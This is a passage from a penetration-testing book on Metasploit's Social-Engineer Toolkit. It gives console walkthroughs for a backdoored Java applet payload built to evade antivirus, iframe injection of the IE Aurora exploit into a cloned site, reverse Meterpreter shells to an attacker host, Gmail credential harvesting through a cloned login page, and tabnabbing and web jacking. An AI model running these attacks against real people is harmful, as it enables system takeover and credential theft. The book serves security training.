left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_408.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">What payload do you want to generate:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Name: Description:</p><p style="text-indent: 0pt;text-align: left;"><br/></p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send</p></li></ol><p class="s25" style="padding-left: 240pt;text-indent: 0pt;line-height: 10pt;text-align: left;">back to attacker.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">Enter choice (hit enter for default):</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Below is a list of encodings to try and bypass AV.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Select one of the below, &#39;backdoored executable&#39; is typically the best.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">16. Backdoored Executable (BEST)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">8 <span class="s25">Enter your choice (enter for default):</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[-] Enter the PORT of the listener (enter for default):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] Backdoor completed successfully. Payload is now hidden within a legit executable.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">******************************************************** Do you want to create a Linux/OSX reverse_tcp payload in the Java Applet attack as well?</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">******************************************************** Enter choice yes or no: <span class="s24">no</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">*************************************************** Web Server Launched. Welcome to the SET Web Attack.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">***************************************************</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 21pt;text-align: left;">[--] Tested on IE6, IE7, IE8, Safari, Chrome, and FireFox [--] [*] Launching MSF Listener...</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] This may take a few to load MSF...</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_409.png"/></span></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;line-height: 83%;text-align: left;">As with other SET attack methods, attackers can use a variety of pay- loads. The default reverse Meterpreter payload <span class="s32">O </span>is usually an excellent selection. For this scenario, you can simply select the defaults when prompted for the encoder to use <span class="s32">8 </span>and the port to use to reconnect.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">With the configuration complete, SET launches Metasploit:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_410.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; exploit -j [*] Exploit running as background job.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[*] Started reverse handler on 10.10.1.112:443 [*] Starting the payload handler...</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(handler) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_411.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 84%;text-align: left;">SET passes all necessary options to Metasploit, which then sets up the reverse Meterpreter listener on port 443 <span class="s32">O</span>.</p><p class="s22" style="padding-top: 7pt;padding-left: 54pt;text-indent: 0pt;text-align: left;">NOTE <span class="s19">You have created a web server housing a cloned instance of </span><span class="p">http://www.secmaniac</span></p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><span class="p">.com/</span>. If you had changed the configuration file to include <span class="s35">WEBATTACK_EMAIL=ON</span>, you would have been prompted to send an email using the spear-phishing attack vector (minus attachments).</p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that everything is set up, you simply need to get a target to browse to the malicious site. Upon reaching the website, the target sees a pop-up warning from the publisher, Microsoft, as shown in Figure 10-2. If the target clicks Run, and most users will, the payload will be executed, and you gain full control of the user’s system.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;">NOTE <span class="s19">Recall that SET’s configuration can self-sign the Java applet with whatever you want. Remember, too, that when the target clicks Run and the payload is executed and deliv- ered, the target is redirected to the legitimate SecManiac website.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="445" height="262" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_412.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 10-2: Java applet prompt</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Back at our attacker machine, the Meterpreter session is successfully established, and we now have access to the target’s machine as shown here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_413.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(handler) &gt; [*] Sending stage (748032 bytes) to 10.10.1.102 [*] Meterpreter session 1 opened (10.10.1.112:443 -&gt; 10.10.1.102:58550)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">sessions -i 1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting interaction with 1...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">shellmeterpreter &gt; <span class="s24">shell</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Process 2800 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Channel 1 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">C:\Documents and Settings\Administrator\Desktop&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_414.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark298">Client-Side Web Exploits</a><a name="bookmark314">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">SET can also use client-side web exploits. In this case, instead of a Java applet being presented to the target, a client-side exploit imported directly from Metasploit is used to attack the system. To use client-side exploits, you must rely on your prior reconnaissance or hope that the user is susceptible to a specific vulnerability. This method is particularly satisfying if a zero-day vul- nerability is discovered: As soon as an exploit is released from Metasploit, it is typically tested and published through SET within the hour.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In this example, we will repeat the previous scenario, but we’ll use a client-side attack. Client-side attacks specifically target (mostly) browser flaws. Most exploits in SET target Internet Explorer; however, Firefox exploits are also used. In this scenario, we’ll use the Aurora attack vector that was used to compromise Google. To begin, do the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_415.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/pentest/exploits/set# <span class="s24">./set</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Select from the menu:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">2. Website Attack Vectors Enter your choice: </span><span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">8 <span class="s25">2. The Metasploit Browser Exploit Method</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice (press enter for default): <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[!] Website Attack Vectors [!]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">@ <span class="s25">2. Site Cloner</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter number (1-4): <span class="s24">2</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.thisisafakesite.com/" class="s34" target="_blank">SET supports both HTTP and HTTPS Example: http://www.thisisafakesite.com</a></p><p class="s30" style="padding-bottom: 1pt;padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O <a href="http://www.secmaniac.com/" class="s34" target="_blank">Enter the url to clone: </a><a href="http://www.secmaniac.com/" class="s40" target="_blank">http://www.secmaniac.com</a></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_416.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s32" style="padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;"><span class="p">Select </span><span class="s25">Website Attack Vectors </span>O <span class="p">from the SET main menu, and then select </span><span class="s25">The Metasploit Browser Exploit Method </span>8<span class="p">. Then select the </span><span class="s25">Site Cloner </span>@ <a href="http://www.secmaniac.com/" class="s31" target="_blank">option, and enter </a><span class="s24">http://www.secmaniac.com </span>O <span class="p">as the website you want to use for cloning.</span></p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Once the site is cloned, we’ll set up the exploit to trigger when a target browses the site.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_417.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Enter the browser exploit you would like to use</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">16. Microsoft Internet Explorer &quot;Aurora&quot;</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter your choice (1-23) (enter for default): <span class="s24">16</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">What payload do you want to generate:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Name: Description:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send</p><p class="s25" style="padding-left: 236pt;text-indent: 0pt;line-height: 10pt;text-align: left;">back to attacker.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">8 <span class="s25">Enter choice (example 1-10) (Enter for default):</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Enter the port to use for the reverse (enter for default):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a href="http://www.secmaniac.com/" class="s34" target="_blank">[*] Cloning the website: </a>http://www.secmaniac.com [*] This could take a little bit...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Injecting iframes into cloned website for MSF Attack....</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Malicious iframe injection successful...crafting payload. [*] Launching MSF Listener...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] This may take a few to load MSF...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; exploit -j [*] Exploit running as background job.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(ms10_002_aurora) &gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 10.10.1.112:443 [*] Using URL: http://0.0.0.0:8080/</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Local IP: http:// 10.10.1.112:8080/ [*] Server started.</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_418.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: left;">To complete the attack setup, select the client-side exploit you wish to use. Above, we choose the infamous Internet Explorer Aurora exploit <span class="s32">O </span>and accept the default reverse Meterpreter payload by pressing <span class="s9">ENTER </span><span class="s32">8</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;"><a href="http://www.secmaniac.com/" class="s31" target="_blank">When the target reaches </a><a href="http://www.secmaniac.com/" class="s20" target="_blank">http://www.secmaniac.com/</a>, the site looks normal,</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">but his system is compromised through an <span class="s19">iframe injection</span>. SET automatically rewrites the site to contain the iframe that houses the Metasploit client-side attack.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Back at the attacking machine, we see that the attack is successful. The Meterpreter session has established the connection from the target to the attacking machine, and we have full access to the system, as shown here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_419.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Sending stage (748032 bytes) to 10.10.1.102</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 1 opened (10.10.1.112:443 -&gt; 10.10.1.102:58412)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">sessions -i 1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting interaction with 1...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">shellmeterpreter &gt; <span class="s24">shell</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Process 2819 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Channel 1 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">C:\Documents and Settings\Administrator\Desktop&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_420.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark299">Username and Password Harvesting</a><a name="bookmark315">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In the preceding examples, the goal was to obtain access to the individual sys- tem. Relatively new within SET is the ability to clone a website and harvest vis- itors’ credentials when they access the site, as we’ll demonstrate using Gmail in this next example. SET can create a clone of the Gmail website and then automatically rewrite the POST parameters of that website to post to the SET web server and then redirect the user to the legitimately cloned website.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_421.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">O <span class="s25">3. Credential Harvester Attack Method</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice (press enter for default): <span class="s24">3</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[!] Website Attack Vectors [!]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">8 <span class="s25">2. Site Cloner</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter number (1-4): <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 92%;text-align: left;">Email harvester will allow you to utilize the clone capabilities within SET to harvest credentials or parameters from a website as well as place them into a report.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.thisisafakesite.com/" class="s34" target="_blank">SET supports both HTTP and HTTPS Example: http://www.thisisafakesite.com</a></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">@ <a href="http://www.secmaniac.com/" class="s34" target="_blank">Enter the url to clone: </a><a href="http://www.secmaniac.com/" class="s40" target="_blank">http://www.secmaniac.com</a></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Press {return} to continue.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Social-Engineer Toolkit Credential Harvester Attack [*] Credential Harvester is running on port 80</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Information will be displayed to you as it arrives below:</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_422.png"/></span></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;">After you select <span class="s25">Website Attack Vectors </span>and the <span class="s25">Credential Harvester </span><span class="s32">O</span>, choose <span class="s25">Site Cloner </span><span class="s32">8</span>. The configuration for this attack is minimal and requires only that you pass a URL (<span class="s24">http://www.secmaniac.com</span>) <span class="s32">@ </span>to SET that contains a login form.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The web server runs and waits for the target’s response. As mentioned previously, you could in this instance set <span class="s25">WEBATTACK_CONFIG=ON</span>, and SET would prompt you to attempt mass emails to coax targets into clicking the link. The target would be presented with a web page that looks identical to Gmail’s website and initial login page. When the target enters his password, the browser automatically redirects to the original Gmail website, while the fol- lowing information is presented to the attacker:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_423.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">10.10.1.102 - - &quot;GET / HTTP/1.1&quot; 200 -</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] WE GOT A HIT! Printing the output:</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">PARAM: ltmpl=default PARAM: ltmplcache=2</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">PARAM: continue=https://mail.google.com/mail/? PARAM: service=mail</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">PARAM: rm=false</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">PARAM: dsh=-1174166214807618980</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">PARAM: ltmpl=default PARAM: ltmpl=default PARAM: scc=1</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">PARAM: ss=1</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">PARAM: GALX=S3ftXFIww0E</p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">POSSIBLE USERNAME FIELD FOUND: Email=ihazomgsecurity2390239203 POSSIBLE PASSWORD FIELD FOUND: Passwd=thisisacomplexp@55w0rd!!!!! <span class="s25">PARAM: rmShown=1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">PARAM: signIn=Sign+in PARAM: asts=</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] WHEN YOU&#39;RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_424.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">SET uses a built-in dictionary to mark form fields and parameters on sites that might contain sensitive information. It red-highlights potential username and password parameters to indicate that they could be sensitive parameters that are worth investigating.</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: justify;">Once you’ve finished harvesting all of the target’s credentials, press <span class="s9">CTRL</span>-C to generate a report, as shown in Figure 10-3. The report uses XML and HTML formatting.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">SET’s web server is multithreaded and can handle as many requests as your server can handle. When a number of targets enter their credentials into the site, SET will automatically parse those results into a report format that separates the form fields in a readable format.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">You can also export the credential harvesting results in an XML-compliant format to later import into tools or parsers that you’re already using.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="437" height="352" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_425.gif"/></span></p><p class="s29" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 10-3: Credential harvester report</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark300">Tabnabbing</a><a name="bookmark316">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In a <span class="s19">tabnabbing </span>scenario, a target is caught while accessing a website with multiple tabs open. When the target clicks a link, he is presented with a “Please wait while the page loads” message. When the target switches tabs, the website detects that a different tab has focus and rewrites the web page that presented the “Please wait . . . ” message with a website you specify.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Eventually, the target clicks the tabnabbed tab, and, believing he is being asked to sign in to his email program or business application, he enters his credentials into the malicious look-alike site. The credentials are harvested, and the target is redirected to the original website. You can access the tab- nabbing attack vector through SET’s web attack vector interface.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark301">Man-Left-in-the-Middle</a><a name="bookmark317">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">A <span class="s19">man-left-in-the-middle </span>attack uses HTTP referers on an already compromised site or a cross-site scripting (XSS) vulnerability to pass the target’s credentials back to the HTTP server. If you find an XSS vulnerability and send the URL to the target, who then clicks the link, the website will operate normally, but when the target logs into the system, his credentials are passed to the attacker. The man-left-in-the-middle attack vector can be accessed through SET’s web attack vector interface.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark302">Web Jacking</a><a name="bookmark318">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s19">web jacking </span>attack method, new in SET version 0.7, allows you to create a website clone, where the target is presented with a link stating that the web- site has moved. When the target hovers over the link, the URL presented is the real URL, not the attacker’s URL. So, for example, if you’re cloning <span class="s19">https://gmail.com/</span>, the URL that would appear on the target’s machine when he hovers his mouse over the link would be <span class="s19">https://gmail.com/</span>. When the tar- get clicks the link, Gmail opens but is quickly replaced with your malicious web server.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">This attack uses a time-based iframe replacement. When the target hov- ers over the link, it points to whatever site you cloned. When the target clicks the link, the iframe replacement will initiate and replace the target’s browser with the malicious cloned site without the target’s knowledge. You can change the timing of a web jacking attack using the <span class="s25">config/set_config </span>flags.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">To configure SET for the attack, select <span class="s25">Web Jacking Attack Method </span><span class="s32">O </span>and <span class="s25">Site Cloner </span><span class="s32">8</span>, and then add the site you want to clone, <span class="s24">https://gmail.com </span><span class="s32">@</span>, as shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_426.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">O <span class="s25">6. Web Jacking Attack Method</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice (press enter for default): <span class="s24">6</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[!] Website Attack Vectors [!]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">8 <span class="s25">2. Site Cloner</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter number (1-4): <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.thisisafakesite.com/" class="s34" target="_blank">SET supports both HTTP and HTTPS Example: http://www.thisisafakesite.com</a></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">@ <span class="s25">Enter the url to clone: </span><span class="s24">https://gmail.com</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Cloning the website: https://gmail.com [*] This could take a little bit...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The best way to use this attack is if username and password form</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">fields are available. Regardless, this captures all POSTs on a website. [*] I have read the above message. [*]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Press {return} to continue.</p><p style="text-indent: 